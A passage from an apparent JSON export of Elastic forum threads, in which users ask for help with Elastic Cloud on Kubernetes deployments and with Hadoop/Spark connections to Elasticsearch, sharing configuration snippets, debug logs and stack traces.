    ],
    "author": "Bozo_Tegeltija",
    "date": "June 20, 2019, 12:28pm June 25, 2019, 7:44am June 25, 2019, 8:05am",
    "body": "I have installed ES cluster on my k8s cluster and no matter how much RAM limit i give to the nodes, they eventually get killed. The load on the cluster is low (approx. 50 docs/min). I have used the default template for Elasticsearch operator with 3 nodes (all masters + data). Monitoring shows that memory is constantly growing for the particular container and when it reaches the limit, kubernetes kills it. I have tried with limits of 6Gi, 12Gi, 40Gi... The kubernetes node has 188GB RAM and it seems to me like the container does not care about the limit and wants to use all of it. Does this have to do with lucene's memory mapped files and how do you solve this?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9a56d1b3-c204-4870-abec-f460469bde1e",
    "url": "https://discuss.elastic.co/t/exposing-kibana-with-istio-virtualservice-need-some-extra-steps/185412",
    "title": "Exposing kibana with istio virtualservice need some extra steps",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "mohamamd",
    "date": "June 13, 2019, 1:04pm June 12, 2019, 6:43pm June 13, 2019, 7:05am June 18, 2019, 12:22pm July 16, 2019, 12:22pm",
    "body": "I have deployed elasticsearch and Kibana using the ECK operator as explained in https://www.elastic.co/guide/en/cloud-on-k8s/current/index.html When I port-forward to Kibana service everything works fine. But if I expose the service using Istio virtualservice I see the login page only but nothing works even I cannot login to Kibana. The problem is when Kibana runs behind a proxy there is some problem with the base path. By default Kibana base path is \" /app/kibana\". So in my Kibana manifest, I tried to set the basepath as environment variable as below apiVersion: kibana.k8s.elastic.co/v1alpha1 kind: Kibana metadata: name: my-kibana namespace: elastic-system spec: version: 7.1.0 nodeCount: 2 elasticsearchRef: name: myelasticsearch podTemplate: metadata: labels: app: my-kibana spec: containers: - name: kibana resources: limits: memory: 1Gi cpu: 1 env: - name: SERVER_BASEPATH value: / But it seems the \"SERVER_BASEPATH\" env variable I tried to set in the pod template gets ignored by \"Kibana\" object. My istio virtualservice is as below apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: kibana namespace: elastic-system spec: hosts: - \"kibana.mydomain.com\" gateways: - istio-system/https-gateway - istio-system/http-to-https-redirect http: #- match: # - uri: # prefix: \"/app/kibana\" # rewrite: # uri: \"/\" # route: # - destination: # host: my-kibana # port: # number: 5601 - route: - destination: host: my-kibana port: number: 5601 Any idea how to expose Kibana using istio when ECK operator is used? NOTE: Please ignore any kind name mismatch as i put custom name here and Kibana works completely fine when I do kubectl portforward",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "3effe0e4-902a-4168-b232-5f4cf37db359",
    "url": "https://discuss.elastic.co/t/k8s-operator-with-custom-es-docker-image/186229",
    "title": "K8s operator with custom ES docker image",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "gboanea",
    "date": "June 18, 2019, 11:00am June 18, 2019, 12:02pm June 18, 2019, 12:20pm",
    "body": "Hi, Is is possible to use a custom Elasticsearch docker image with the K8s operator? Thank you, Georgeta",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "94f0b187-989a-4884-bfb0-eccf465d9577",
    "url": "https://discuss.elastic.co/t/quickstart-example-aws-persistent-storage/185212",
    "title": "Quickstart Example - AWS Persistent Storage",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "tomseddon",
    "date": "June 11, 2019, 2:11pm June 12, 2019, 9:12am June 17, 2019, 12:39pm",
    "body": "Hi, I've been trying out the example on my kops K8s setup on AWS (not EKS). I can get the first example to work but when I move on to trying to allocate a PersistentVolumeClaim I run into difficulties. The example given uses gcePersistentDisk, so I try to use the equivalent AWS PVC and can't seem to get it to work. The following give an error in the operator logs of DNS-1123 subdomain must consist of lower case alphanumeric characters: AWSElasticBlockStore awsElasticBlockStore Following the error message, I try: awselasticblockstore Which results in pods being created but a describe on them shows: pod has unbound immediate PersistentVolumeClaims What is the correct way to provision persistent storage on AWS? Thanks, Tom",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "5770924d-56da-4bd5-8070-cd5766f2cf21",
    "url": "https://discuss.elastic.co/t/filebeat-installed-as-daemon-set-in-ibm-private-cloud-kubernetes-cluster-dont-send-logs-to-elastic-cloud-instance/184406",
    "title": "Filebeat installed as Daemon Set in IBM Private Cloud Kubernetes Cluster don't send logs to Elastic Cloud instance",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "l.rava",
    "date": "June 5, 2019, 3:09pm June 5, 2019, 3:15pm June 16, 2019, 8:47pm",
    "body": "Hi I installed as Daemon Set metricBeat and fileBeat into my infrastracture: IBM Private Cloud kubernetes cluster - 2 nodes - v.1.13 following this guide. MetricBeat send data without problem. Filebeat don't send data. here logs in debug for filebeat: INFO instance/beat.go:571 Home path: [/usr/share/filebeat] Config path: [/usr/share/filebeat] Data path: [/usr/share/filebeat/data] Logs path: [/usr/share/filebeat/logs] DEBUG [beat] instance/beat.go:623 Beat metadata path: /usr/share/filebeat/data/meta.json INFO instance/beat.go:579 Beat ID: 8498bd87-16c3-42a3-b5e0-4ca23133a429 INFO [index-management.ilm] ilm/ilm.go:129 Policy name: filebeat-7.1.1 DEBUG [filters] add_cloud_metadata/add_cloud_metadata.go:164 add_cloud_metadata: starting to fetch metadata, timeout=3s DEBUG [filters] add_cloud_metadata/add_cloud_metadata.go:196 add_cloud_metadata: received disposition for qcloud after 339.455729ms. result=[provider:qcloud, error=failed requesting qcloud metadata: Get http://metadata.tencentyun.com/meta-data/instance-id: dial tcp: lookup metadata.tencentyun.com on 172.21.0.10:53: no such host, metadata={}] DEBUG [filters] add_cloud_metadata/add_cloud_metadata.go:196 add_cloud_metadata: received disposition for openstack after 3.000222149s. result=[provider:openstack, error=failed requesting openstack metadata: Get http://169.254.169.254/2009-04-04/meta-data/hostname: dial tcp 169.254.169.254:80: i/o timeout, metadata={}] DEBUG [filters] add_cloud_metadata/add_cloud_metadata.go:203 add_cloud_metadata: timed-out waiting for all responses DEBUG [filters] add_cloud_metadata/add_cloud_metadata.go:167 add_cloud_metadata: fetchMetadata ran for 3.000347097s INFO add_cloud_metadata/add_cloud_metadata.go:346 add_cloud_metadata: hosting provider type not detected. DEBUG [processors] processors/processor.go:66 Processors: add_cloud_metadata=null DEBUG [seccomp] seccomp/seccomp.go:109 Loading syscall filter {\"seccomp_filter\": {\"no_new_privs\":true,\"flag\":\"tsync\",\"policy\":{\"default_action\":\"errno\",\"syscalls\":[{\"names\":[\"accept\",\"accept4\",...,\"writev\"],\"action\":\"allow\"}]}}} INFO [seccomp] seccomp/seccomp.go:116 Syscall filter successfully installed INFO [beat] instance/beat.go:827 Beat info {\"system_info\": {\"beat\": {\"path\": {\"config\": \"/usr/share/filebeat\", \"data\": \"/usr/share/filebeat/data\", \"home\": \"/usr/share/filebeat\", \"logs\": \"/usr/share/filebeat/logs\"}, \"type\": \"filebeat\", \"uuid\": \"8498bd87-16c3-42a3-b5e0-4ca23133a429\"}}} INFO [beat] instance/beat.go:836 Build info {\"system_info\": {\"build\": {\"commit\": \"3358d9a5a09e3c6709a2d3aaafde628ea34e8419\", \"libbeat\": \"7.1.1\", \"time\": \"2019-05-23T13:21:33.000Z\", \"version\": \"7.1.1\"}}} INFO [beat] instance/beat.go:839 Go runtime info {\"system_info\": {\"go\": {\"os\":\"linux\",\"arch\":\"amd64\",\"max_procs\":4,\"version\":\"go1.11.5\"}}} INFO [beat] instance/beat.go:843 Host info {\"system_info\": {\"host\": {\"architecture\":\"x86_64\",\"boot_time\":\"2019-04-26T14:06:48Z\",\"containerized\":false,\"name\":\"kube-fra02-cr7a*************49fc787c-w5.cloud.ibm\",\"ip\":[\"127.0.0.1/8\",\"172.20.0.1/32\",\"::1/128\",\"10.XX.225.43/26\",\"fe80::467:43ff:fec8:f89c/64\",\"158.XX.138.101/28\",\"158.XX.145.222/32\",\"fe80::xxx:72ff:fe53:6022/64\",\"127.0.0.10/31\",\"fe80::bcaa:c3ff:fe81:c38/64\",\"172.30.7.64/32\"}}} INFO [beat] instance/beat.go:872 Process info {\"system_info\": {\"process\": {\"capabilities\": {\"inheritable\":[\"chown\",\"dac_override\",\"fowner\",\"fsetid\",\"kill\",\"setgid\",\"setuid\",\"setpcap\",\"net_bind_service\",\"net_raw\",\"sys_chroot\",\"mknod\",\"audit_write\",\"setfcap\"],\"permitted\":[\"chown\",\"dac_override\",\"fowner\",\"fsetid\",\"kill\",\"setgid\",\"setuid\",\"setpcap\",\"net_bind_service\",\"net_raw\",\"sys_chroot\",\"mknod\",\"audit_write\",\"setfcap\"],\"effective\":[\"chown\",\"dac_override\",\"fowner\",\"fsetid\",\"kill\",\"setgid\",\"setuid\",\"setpcap\",\"net_bind_service\",\"net_raw\",\"sys_chroot\",\"mknod\",\"audit_write\",\"setfcap\"],\"bounding\":[\"chown\",\"dac_override\",\"fowner\",\"fsetid\",\"kill\",\"setgid\",\"setuid\",\"setpcap\",\"net_bind_service\",\"net_raw\",\"sys_chroot\",\"mknod\",\"audit_write\",\"setfcap\"],\"ambient\":null}, \"cwd\": \"/usr/share/filebeat\", \"exe\": \"/usr/share/filebeat/filebeat\", \"name\": \"filebeat\", \"pid\": 1, \"ppid\": 0, \"seccomp\": {\"mode\":\"filter\"}, \"start_time\": \"2019-06-05T12:35:27.460Z\"}}} INFO instance/beat.go:280 Setup Beat: filebeat; Version: 7.1.1 DEBUG [beat] instance/beat.go:301 Initializing output plugins INFO [index-management] idxmgmt/std.go:165 Set output.elasticsearch.index to 'filebeat-7.1.1' as ILM is enabled. INFO elasticsearch/client.go:165 Elasticsearch url: https://51fxxxxxxxxxxxxf3c92201363c.europe-west1.gcp.cloud.es.io:443 DEBUG [publisher] pipeline/consumer.go:137 start pipeline event consumer INFO [publisher] pipeline/module.go:97 Beat name: kube-fra02-cr7a4aeac0xxxxxxx40c8c9799d049fc787c-w5.cloud.ibm INFO instance/beat.go:391 filebeat start running. DEBUG [test] registrar/migrate.go:159 isFile(/usr/share/filebeat/data/registry) -> false DEBUG [test] registrar/migrate.go:159 isFile() -> false DEBUG [test] registrar/migrate.go:152 isDir(/usr/share/filebeat/data/registry/filebeat) -> true DEBUG [test] registrar/migrate.go:159 isFile(/usr/share/filebeat/data/registry/filebeat/meta.json) -> true INFO [monitoring] log/log.go:117 Starting metrics logging every 30s DEBUG [registrar] registrar/migrate.go:51 Registry type '0' found DEBUG [registrar] registrar/registrar.go:125 Registry file set to: /usr/share/filebeat/data/registry/filebeat/data.json INFO registrar/registrar.go:145 Loading registrar data from /usr/share/filebeat/data/registry/filebeat/data.json INFO registrar/registrar.go:152 States Loaded from registrar: 0 INFO crawler/crawler.go:72 Loading Inputs: 0 INFO crawler/crawler.go:106 Loading and starting Inputs completed. Enabled inputs: 0 WARN [cfgwarn] kubernetes/kubernetes.go:55 BETA: The kubernetes autodiscover is beta INFO kubernetes/util.go:86 kubernetes: Using pod name kube-fra02-cr7a4aeacxxxxx799d049fc787c-w5.cloud.ibm and namespace kube-system to discover kubernetes node INFO cfgfile/reload.go:150 Config reloader started DEBUG [registrar] registrar/registrar.go:278 Starting Registrar ERROR kubernetes/util.go:90 kubernetes: Querying for pod failed with error: kubernetes api: Failure 404 pods \"kube-fra02-cr7a4aeac036c7440c8c9799d049fc787c-w5.cloud.ibm\" not found",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "da2370f6-61a3-430a-85e8-b176f7ce01de",
    "url": "https://discuss.elastic.co/t/issue-elasticsearch-pods-are-running-into-crashloopbackoff-because-of-inject-process-manager-container/185382",
    "title": "Issue: Elasticsearch pods are running into crashloopbackoff because of inject-process-manager container",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Batchu",
    "date": "June 12, 2019, 10:18am June 13, 2019, 2:26am June 13, 2019, 6:19am June 13, 2019, 6:20am June 13, 2019, 6:22am June 13, 2019, 6:24am",
    "body": "github.com/elastic/cloud-on-k8s Issue: Elasticsearch pods are running into crashloopbackoff because of inject-process-manager container opened by aakarshit-batchu on 2019-06-12 Bug Report What did you do? I just freshly installed an Elastic stack on Kubernetes in following tutorial: https://www.elastic.co/guide/en/cloud-on-k8s/current/index.html So I have an elasticsearch cluster... What did you do? I just freshly installed an Elastic stack on Kubernetes in following tutorial: https://www.elastic.co/guide/en/cloud-on-k8s/current/index.html So I have an elasticsearch cluster of three nodes (test phase;)) + an instance of Kibana that connects to it. Everything seems to work because everything is in a \"green\" state: [root@chnkubmtr36 es-operator]# kubectl get elasticsearch NAME HEALTH NODES VERSION PHASE AGE quickstart green 3 7.1.0 Operational 26m But all the elasticsearch-pods are in the crashloopbackoff state. [root@chnkubmtr36 es-operator]# kubectl get po -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES quickstart-es-55mbfz28n8 0/1 Init:CrashLoopBackOff 2 28m 10.233.66.163 chnkubnode38 <none> <none> quickstart-es-d789sfck4d 0/1 Init:CrashLoopBackOff 2 28m 10.233.65.56 chnkubnode37 <none> <none> quickstart-es-g8dx797tw5 0/1 Init:CrashLoopBackOff 1 28m 10.233.64.129 chnkubmtr36 <none> <none> What did you expect to see? All the pods in running state without any errors. What did you see instead? Under which circumstances? Elasticsearch pods in crashloopbackoff and when described the elasticsearch pods, we found out that inject-process-manager container is going to crashloopbackoff. and we are not able to view its logs as well. So what are functionalities of inject-process-manager container? and on what all conditions does it fail? Environment Vmware Vms CentOS Linux release 7.6.1810 (Core) Kubernetes - 1.13.5 (on premise setup) Docker - 18.09.1 $ kubectl version - 1.13.5",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "f8cc6862-3565-499c-a388-ff1a8bf83d1d",
    "url": "https://discuss.elastic.co/t/using-a-custom-docker-image-for-elastic-cloud-on-kubernetes/184241",
    "title": "Using a custom docker image for Elastic Cloud on Kubernetes",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "rutomo",
    "date": "June 4, 2019, 6:09pm June 5, 2019, 7:32am June 5, 2019, 12:21pm June 5, 2019, 12:26pm June 5, 2019, 1:45pm June 5, 2019, 1:59pm June 5, 2019, 3:08pm",
    "body": "Hi, I'm looking into or doing some research on Elastic Cloud on Kubernetes and went through the Quickstart page but I couldn't find a way to use ECK with a custom ES docker image hosted on docker hub. Is there a way to do so?",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "6d5242a0-f8e8-456a-b6d5-2df94f3b7a1c",
    "url": "https://discuss.elastic.co/t/about-the-hadoop-and-elasticsearch-category/229",
    "title": "About the Hadoop and Elasticsearch category",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Leslie_Hawthorn",
    "date": "May 5, 2015, 3:06pm May 6, 2015, 5:42am May 14, 2015, 6:52am May 14, 2015, 6:52am",
    "body": "Questions about Elasticsearch and all things Hadoop (Map/Reduce, Hive, Pig, Cascading, Spark and friends)",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "2ca2dcf9-62ff-4497-a29f-766beecb299c",
    "url": "https://discuss.elastic.co/t/hive-to-elastic-data-load/228066",
    "title": "Hive to Elastic Data Load",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "",
    "date": "April 16, 2020, 8:35am April 16, 2020, 7:50am April 16, 2020, 8:18am April 16, 2020, 8:19am April 16, 2020, 8:53am April 16, 2020, 8:56am April 16, 2020, 9:06am April 16, 2020, 9:16am April 17, 2020, 12:21pm April 17, 2020, 12:47pm April 21, 2020, 4:45pm April 22, 2020, 10:00am",
    "body": "",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "e5df5b81-2124-4f28-9fa3-ec0bd3ebe2d7",
    "url": "https://discuss.elastic.co/t/getting-records-rejected-during-bulk-insert-which-are-not-related-to-the-400-failed-to-parse-reason/228695",
    "title": "Getting records rejected during bulk insert, which are not related to the '400 Failed to parse' reason",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "gusuku",
    "date": "April 19, 2020, 3:23am",
    "body": "Using Bulk API to upsert mini-batches of records to Elasticsearch 5.1 When I try to upsert a badly formatted record (hence getting a 400 Failed to parse), most times ES rejects just that record in that batch. But sometimes, ES rejects that record as well as other records in that batch that do not have that issue (confirmed by successfully upserting those records in a different batch). Is this expected? How to understand this inconsistent behavior?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "078d9ade-c7f8-4bd4-b09d-87b3b71d253d",
    "url": "https://discuss.elastic.co/t/pass-entire-document-into-update-script-params/224014",
    "title": "Pass Entire Document into Update Script Params",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "weizilla",
    "date": "March 18, 2020, 2:29am March 18, 2020, 5:12pm April 15, 2020, 5:12pm",
    "body": "According to Update settings (when writing to Elasticsearch), I can provide a list of fields to be passed into my update script params with es.update.script.params. Is there a way to say I want the entire document being indexed to be passed in? Essentially all fields without explicitly listing each one? I realize I could just wrap the whole document in a single dummy field and list that in params but I'm performing upserts and don't want that dummy wrapper in the document if it does an insert. I'm using es.input.json = true",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "8c23e15c-e5ca-46be-ab47-03a4da2dc1db",
    "url": "https://discuss.elastic.co/t/es-hadoop-hive-integration-with-tls-ssl-security/222853",
    "title": "ES-Hadoop Hive Integration with TLS/SSL Security",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "",
    "date": "March 10, 2020, 4:38am March 10, 2020, 6:21am April 7, 2020, 6:21am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d1c400f9-c019-45da-a04b-748486466571",
    "url": "https://discuss.elastic.co/t/java-lang-classnotfoundexception-org-apache-spark-partition-class/222588",
    "title": "java.lang.ClassNotFoundException: org.apache.spark.Partition$class",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Zeeshan_Haider",
    "date": "March 8, 2020, 8:53am April 5, 2020, 8:00am",
    "body": "I have been trying to access or read Elasticsearch data into an RDD using code below val es_rdd = sc.esRDD(\"spark/docs\", \"?q=me*\") println(es_rdd.first()) but I recieved an error which is mentioned in the title. Am I missing something here just to access data of a simple index and by the way my elasticsearch spark configutrations are these spark.es.nodes: 127.0.0.1 spark.es.port: \"9200\" spark.es.http.timeout: 5m spark.es.scroll.size: \"50\" spark.es.resource: \"spark/docs\" spark.es.resource.read: \"spark/docs\" spark.es.resource.write: writestoday spark.es.index.read.missing.as.empty: \"true\" spark.es.query: \"?q=costinl\" spark.es.nodes.wan.only: \"true\" spark.es.index.auto.create: \"true\" spark.es.net.ssl: \"false\" Write is working perfectly.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "63bb1370-5302-4645-915c-89c531ae21b6",
    "url": "https://discuss.elastic.co/t/reading-elasticsearch-data-using-spark-sql-is-too-slow/222393",
    "title": "Reading elasticsearch data using spark SQL is too slow",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "hyungsun_lim",
    "date": "March 6, 2020, 2:24am April 3, 2020, 2:24am",
    "body": "Hello, i have a question about spark - es. I write code like below # Initializing PySpark from pyspark import SparkContext, SparkConf, SQLContext # Spark Config conf = SparkConf().setAppName(\"es_app\") sc = SparkContext(conf=conf) # sqlContext sqlContext = SQLContext(sc) # ES to dataframe df = sqlContext.read.format(\"org.elasticsearch.spark.sql\").option(\"es.nodes\",\"xxx.xxx.xxx.xxx:9200\").option(\"es.nodes.discovery\", \"true\").load(\"sample\") # make view df.registerTempTable(\"sample\") # Too long sqlContext.sql(\"SELECT count(*) from sample\").show() The 'sample' index contain 5,000,000 documents. However when i query about sql. It take so long time to get result. (20 min takes approximately) Maybe something wrong, but i don't know the reason. Do i have to add more option?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "499f7b18-51e6-441b-9234-499c99033793",
    "url": "https://discuss.elastic.co/t/unable-to-resolve-ip-for-complex-es-hostname/221329",
    "title": "Unable to resolve ip for complex ES hostname",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "kkshah",
    "date": "February 28, 2020, 2:07pm March 26, 2020, 9:30pm",
    "body": "I have an Elasticsearch URL with embedded username/password that looks something like this: https://USERNAME:PASSWORD@ADDRESS/some/path/to/elasticsearch Of course, I have no issues submitting queries to this address using CURL (using default port, 443). However, I am attempting to use elasticsearch-hadoop with PySpark to fetch data from this URL, and it seems to be resolving the hostname to just USERNAME Steps to reproduce Code: import pyspark from pyspark.sql import SparkSession import os os.environ['PYSPARK_SUBMIT_ARGS'] = '--jars /path/to/elasticsearch-hadoop-7.6.0/dist/elasticsearch-spark-20_2.11-7.6.0.jar pyspark-shell' spark = SparkSession.builder.getOrCreate() es_read_conf = { \"es.nodes\" : \"https://USERNAME:PASSWORD@ADDRESS/some/path/to/elasticsearch \", \"es.port\" : \"443\", \"es.resource\" : \"reviews/basic\" } es_rdd = spark.sparkContext.newAPIHadoopRDD( inputFormatClass=\"org.elasticsearch.hadoop.mr.EsInputFormat\", keyClass=\"org.apache.hadoop.io.NullWritable\", valueClass=\"org.elasticsearch.hadoop.mr.LinkedMapWritable\", conf=es_read_conf) Strack trace: Py4JJavaError: An error occurred while calling z:org.apache.spark.api.python.PythonRDD.newAPIHadoopRDD. : org.elasticsearch.hadoop.EsHadoopIllegalArgumentException: Cannot resolve ip for hostname: USERNAME at org.elasticsearch.hadoop.util.SettingsUtils.resolveHostToIpIfNecessary(SettingsUtils.java:84) at org.elasticsearch.hadoop.util.SettingsUtils.qualifyNodes(SettingsUtils.java:46) at org.elasticsearch.hadoop.util.SettingsUtils.declaredNodes(SettingsUtils.java:142) at org.elasticsearch.hadoop.util.SettingsUtils.discoveredOrDeclaredNodes(SettingsUtils.java:148) at org.elasticsearch.hadoop.rest.NetworkClient.<init>(NetworkClient.java:64) at org.elasticsearch.hadoop.rest.NetworkClient.<init>(NetworkClient.java:58) at org.elasticsearch.hadoop.rest.RestClient.<init>(RestClient.java:101) at org.elasticsearch.hadoop.rest.InitializationUtils.discoverClusterInfo(InitializationUtils.java:327) at org.elasticsearch.hadoop.rest.RestService.findPartitions(RestService.java:220) at org.elasticsearch.hadoop.mr.EsInputFormat.getSplits(EsInputFormat.java:414) at org.elasticsearch.hadoop.mr.EsInputFormat.getSplits(EsInputFormat.java:395) at org.apache.spark.rdd.NewHadoopRDD.getPartitions(NewHadoopRDD.scala:130) at org.apache.spark.rdd.RDD$$anonfun$partitions$2.apply(RDD.scala:253) at org.apache.spark.rdd.RDD$$anonfun$partitions$2.apply(RDD.scala:251) at scala.Option.getOrElse(Option.scala:121) at org.apache.spark.rdd.RDD.partitions(RDD.scala:251) at org.apache.spark.rdd.MapPartitionsRDD.getPartitions(MapPartitionsRDD.scala:49) at org.apache.spark.rdd.RDD$$anonfun$partitions$2.apply(RDD.scala:253) at org.apache.spark.rdd.RDD$$anonfun$partitions$2.apply(RDD.scala:251) at scala.Option.getOrElse(Option.scala:121) at org.apache.spark.rdd.RDD.partitions(RDD.scala:251) at org.apache.spark.rdd.RDD$$anonfun$take$1.apply(RDD.scala:1343) at org.apache.spark.rdd.RDDOperationScope$.withScope(RDDOperationScope.scala:151) at org.apache.spark.rdd.RDDOperationScope$.withScope(RDDOperationScope.scala:112) at org.apache.spark.rdd.RDD.withScope(RDD.scala:363) at org.apache.spark.rdd.RDD.take(RDD.scala:1337) at org.apache.spark.api.python.SerDeUtil$.pairRDDToPython(SerDeUtil.scala:239) at org.apache.spark.api.python.PythonRDD$.newAPIHadoopRDD(PythonRDD.scala:302) at org.apache.spark.api.python.PythonRDD.newAPIHadoopRDD(PythonRDD.scala) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at py4j.reflection.MethodInvoker.invoke(MethodInvoker.java:244) at py4j.reflection.ReflectionEngine.invoke(ReflectionEngine.java:357) at py4j.Gateway.invoke(Gateway.java:282) at py4j.commands.AbstractCommand.invokeMethod(AbstractCommand.java:132) at py4j.commands.CallCommand.execute(CallCommand.java:79) at py4j.GatewayConnection.run(GatewayConnection.java:238) at java.lang.Thread.run(Thread.java:748) Version Info OS: : Mac OS Mojave 10.14.6 JVM : openjdk version \"1.8.0_212\" OpenJDK Runtime Environment (AdoptOpenJDK)(build 1.8.0_212-b04) OpenJDK 64-Bit Server VM (AdoptOpenJDK)(build 25.212-b04, mixed mode) Hadoop/Spark: Spark 2.4.4 ES-Hadoop : 7.6.0 ES : 6.8.1 Any help would be appreciated! Edit I've also tried this config: es_read_conf = { \"es.nodes\" : \"https://ADDRESS:443/path/to/elasticsearch\", \"es.resource\" : \"reviews/basic\", \"es.net.http.auth.user\": \"USERNAME\", \"es.net.http.auth.pass\": \"PASSWORD\" } Where I get this error: Py4JJavaError: An error occurred while calling z:org.apache.spark.api.python.PythonRDD.newAPIHadoopRDD. : org.elasticsearch.hadoop.EsHadoopIllegalArgumentException: Cannot detect ES version - typically this happens if the network/Elasticsearch cluster is not accessible or when targeting a WAN/Cloud instance without the proper setting 'es.nodes.wan.only' at org.elasticsearch.hadoop.rest.InitializationUtils.discoverClusterInfo(InitializationUtils.java:340) at org.elasticsearch.hadoop.rest.RestService.findPartitions(RestService.java:220) at org.elasticsearch.hadoop.mr.EsInputFormat.getSplits(EsInputFormat.java:414) at org.elasticsearch.hadoop.mr.EsInputFormat.getSplits(EsInputFormat.java:395) at org.apache.spark.rdd.NewHadoopRDD.getPartitions(NewHadoopRDD.scala:130) at org.apache.spark.rdd.RDD$$anonfun$partitions$2.apply(RDD.scala:253) at org.apache.spark.rdd.RDD$$anonfun$partitions$2.apply(RDD.scala:251) at scala.Option.getOrElse(Option.scala:121) at org.apache.spark.rdd.RDD.partitions(RDD.scala:251) at org.apache.spark.rdd.MapPartitionsRDD.getPartitions(MapPartitionsRDD.scala:49) at org.apache.spark.rdd.RDD$$anonfun$partitions$2.apply(RDD.scala:253) at org.apache.spark.rdd.RDD$$anonfun$partitions$2.apply(RDD.scala:251) at scala.Option.getOrElse(Option.scala:121) at org.apache.spark.rdd.RDD.partitions(RDD.scala:251) at org.apache.spark.rdd.RDD$$anonfun$take$1.apply(RDD.scala:1343) at org.apache.spark.rdd.RDDOperationScope$.withScope(RDDOperationScope.scala:151) at org.apache.spark.rdd.RDDOperationScope$.withScope(RDDOperationScope.scala:112) at org.apache.spark.rdd.RDD.withScope(RDD.scala:363) at org.apache.spark.rdd.RDD.take(RDD.scala:1337) at org.apache.spark.api.python.SerDeUtil$.pairRDDToPython(SerDeUtil.scala:239) at org.apache.spark.api.python.PythonRDD$.newAPIHadoopRDD(PythonRDD.scala:302) at org.apache.spark.api.python.PythonRDD.newAPIHadoopRDD(PythonRDD.scala) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at py4j.reflection.MethodInvoker.invoke(MethodInvoker.java:244) at py4j.reflection.ReflectionEngine.invoke(ReflectionEngine.java:357) at py4j.Gateway.invoke(Gateway.java:282) at py4j.commands.AbstractCommand.invokeMethod(AbstractCommand.java:132) at py4j.commands.CallCommand.execute(CallCommand.java:79) at py4j.GatewayConnection.run(GatewayConnection.java:238) at java.lang.Thread.run(Thread.java:748) Caused by: org.elasticsearch.hadoop.rest.EsHadoopInvalidRequest: [GET] on [] failed; server[https://RESOLVED_IP:PORT/path/to/elasticsearch] returned [404|Not Found:] at org.elasticsearch.hadoop.rest.RestClient.checkResponse(RestClient.java:477) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:434) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:428) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:388) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:392) at org.elasticsearch.hadoop.rest.RestClient.get(RestClient.java:168) at org.elasticsearch.hadoop.rest.RestClient.mainInfo(RestClient.java:745) at org.elasticsearch.hadoop.rest.InitializationUtils.discoverClusterInfo(InitializationUtils.java:330) ... 32 more I noticed that for some reason it is trying to resolve the IP of the hostname provided, which will in fact return a 404. I tried with the es.nodes.wan.only\": \"true\" option, and now it is using the hostname. However, there is still a 404 for some reason: Caused by: org.elasticsearch.hadoop.rest.EsHadoopInvalidRequest: [GET] on [] failed; server[https://ADDRESS:PORT/path/to/elasticsearch] returned [404|Not Found:]",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f301b3fd-cbad-40cc-bad0-e6e5f91dae25",
    "url": "https://discuss.elastic.co/t/reading-nested-data-from-elasticsearch-via-spark-scala/221403",
    "title": "Reading Nested data from ElasticSearch via Spark Scala",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Apurw",
    "date": "February 28, 2020, 10:36am March 27, 2020, 10:36am",
